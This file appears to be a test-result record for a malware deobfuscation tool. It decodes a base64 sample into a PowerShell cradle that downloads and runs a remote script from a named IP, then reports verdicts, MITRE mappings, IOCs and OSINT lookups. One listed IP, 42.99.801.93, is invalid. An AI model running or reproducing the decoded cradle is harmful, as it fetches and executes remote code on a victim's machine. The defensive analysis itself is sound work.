@@ -1,0 +1,502 @@
+{
+  "sample_id": "R2_S05_iwr_url_b64",
+  "wrap": "URL(b64(P))",
+  "input": "SUVYKGl3ciAtdXNlYiBodHRwOi8vMzkuMTA4Ljk5LjI0L2EucHMxKQ%3D%3D",
+  "input_sha1": "796b2cd05d23b9fe08553ab47d091204b6af2830",
+  "expected_plaintext": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+  "expected_token": "IEX",
+  "http_ms": 13370,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "extract-payload",
+        "args": {},
+        "reason": "Isolated payload string from script/command wrapper"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      }
+    ],
+    "output": "IEX(iwr -useb http://39.108.99.24/a.ps1)\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart \u00b7 conf 100/100\n  Chain:       extract-payload \u2192 base64-decode\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n    T1059.001    \u00b7 Execution\n\n  IOCs\n    URL       http://39.108.99.24/a.ps1\n    IP        39.108.99.24\n    IP        42.99.801.93\n\n  Behavior\n    1. Executes PowerShell (T1059.001)\n    2. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Payload isolated from script/command wrapper (thumb rule)"
+    ],
+    "detected_type": null,
+    "engine": "smart",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "extract-payload",
+        "args": {},
+        "reason": "Isolated payload string from script/command wrapper",
+        "output_preview": "SUVYKGl3ciAtdXNlYiBodHRwOi8vMzkuMTA4Ljk5LjI0L2EucHMxKQ",
+        "output_length": 54,
+        "evidence": {
+          "encoding": "Payload isolation (script wrapper strip)",
+          "op": "extract-payload",
+          "length": 54,
+          "ascii": true,
+          "entropy": 5.12,
+          "hex_preview": "53 55 56 59 4b 47 6c 33 63 69 41 74 64 58 4e 6c \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+        "output_length": 40,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 40,
+          "ascii": true,
+          "entropy": 4.634,
+          "hex_preview": "49 45 58 28 69 77 72 20 2d 75 73 65 62 20 68 74 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "extract-payload",
+      "base64-decode"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 60,
+        "length_bucket": "xs",
+        "entropy": 5.19,
+        "b64_density": 0.967,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": false,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "mixed",
+        "entropy": 5.19,
+        "length": 60,
+        "letter_ratio": 0.833,
+        "digit_ratio": 0.133,
+        "punct_ratio": 0.033,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.58,
+        "priors": [],
+        "reasons": [
+          "mixed-shape"
+        ]
+      },
+      "output_profile": {
+        "kind": "script_wrapper",
+        "entropy": 4.634,
+        "length": 40,
+        "letter_ratio": 0.425,
+        "digit_ratio": 0.25,
+        "punct_ratio": 0.275,
+        "space_ratio": 0.05,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.176,
+        "priors": [
+          "extract-payload",
+          "powershell-encoded",
+          "powershell-deobfuscate"
+        ],
+        "reasons": [
+          "script-marker"
+        ]
+      },
+      "input_linguistic_score": 0.0443,
+      "output_linguistic_score": 0.8862,
+      "linguistic_delta": 0.8419,
+      "confidence": {
+        "confidence": 0.8346,
+        "band": "high",
+        "structural": 0.7,
+        "readability": 0.9488,
+        "entropy_sanity": 0.95,
+        "context": 0.75,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=1.00)",
+          "readability: printable=1.00, linguistic=0.89",
+          "entropy: natural-text-entropy=4.63",
+          "context: output-has-actionable-tokens"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=1.00)"
+          },
+          "readability": {
+            "score": 0.9488,
+            "reason": "printable=1.00, linguistic=0.89"
+          },
+          "entropy_sanity": {
+            "score": 0.95,
+            "reason": "natural-text-entropy=4.63"
+          },
+          "context": {
+            "score": 0.75,
+            "reason": "output-has-actionable-tokens"
+          }
+        }
+      },
+      "explanation": "Chain [extract-payload \u2192 base64-decode] substantially improved readability (\u0394=+0.842 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 2,
+        "score": 1.075,
+        "verdict": "decoded"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 2,
+        "score": 1.075,
+        "verdict": "decoded"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 2,
+        "op": "base64-decode",
+        "iocs": {
+          "urls": [
+            "http://39.108.99.24/a.ps1"
+          ],
+          "ips": [
+            "39.108.99.24"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": []
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 70,
+      "reason": "URL surfaced in decoded output: http://39.108.99.24/a.ps1).",
+      "indicators": [
+        {
+          "label": "Low entropy (4.63) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://39.108.99.24/a.ps1)",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 70
+    },
+    "iocs": {
+      "urls": [
+        "http://39.108.99.24/a.ps1"
+      ],
+      "ips": [
+        "39.108.99.24",
+        "42.99.801.93"
+      ],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      {
+        "id": "T1059.001",
+        "technique": "PowerShell: Invoke-Expression",
+        "tactic": "Execution"
+      }
+    ],
+    "lolbas": [],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "SUVYKGl3ciAtdXNlYiBodHRwOi8vMzkuMTA4Ljk5LjI0L2EucHMxKQ%3D%3D",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 0,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 2,
+        "label": "L2 \u00b7 BASE64-DECODE",
+        "op": "base64-decode",
+        "preview": "http://39.108.99.24/a.ps1 39.108.99.24",
+        "iocs": {
+          "urls": [
+            "http://39.108.99.24/a.ps1"
+          ],
+          "ips": [
+            "39.108.99.24"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [
+          {
+            "id": "T1566.001",
+            "technique": "Malicious attachment / delivery vehicle (ISO/IMG/HTA/LNK/PS1/VBS/JS)",
+            "tactic": "Initial Access"
+          }
+        ],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [
+            {
+              "value": "39.108.99.24",
+              "reverse_dns": null,
+              "geo": {
+                "status": "success",
+                "country": "China",
+                "countryCode": "CN",
+                "regionName": "Guangdong",
+                "city": "Shenzhen",
+                "isp": "Hangzhou Alibaba Advertising Co",
+                "org": "Aliyun Computing Co., LTD",
+                "as": "AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",
+                "mobile": false,
+                "proxy": false,
+                "hosting": true,
+                "query": "39.108.99.24"
+              },
+              "abuseipdb": {
+                "abuse_confidence_score": 0,
+                "country_code": "CN",
+                "usage_type": "Data Center/Web Hosting/Transit",
+                "isp": "Aliyun Computing Co., LTD",
+                "total_reports": 0,
+                "last_reported_at": "2025-03-06T02:04:49+00:00",
+                "is_tor": false
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": 0,
+                "pulses": []
+              }
+            }
+          ],
+          "domains": [],
+          "urls": [
+            {
+              "value": "http://39.108.99.24/a.ps1",
+              "scheme": "http",
+              "host": "39.108.99.24",
+              "path": "/a.ps1",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 11,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+        "iocs": {
+          "urls": [
+            "http://39.108.99.24/a.ps1"
+          ],
+          "ips": [
+            "39.108.99.24"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          },
+          {
+            "id": "T1059.001",
+            "technique": "PowerShell: Invoke-Expression",
+            "tactic": "Execution"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "IEX_Invocation",
+            "severity": "high",
+            "match": "IEX",
+            "description": "In-memory execution via IEX"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 20,
+          "band": "low"
+        }
+      }
+    ],
+    "output_raw": "IEX(iwr -useb http://39.108.99.24/a.ps1)",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart \u00b7 conf 100/100\n  Chain:       extract-payload \u2192 base64-decode\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n    T1059.001    \u00b7 Execution\n\n  IOCs\n    URL       http://39.108.99.24/a.ps1\n    IP        39.108.99.24\n    IP        42.99.801.93\n\n  Behavior\n    1. Executes PowerShell (T1059.001)\n    2. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
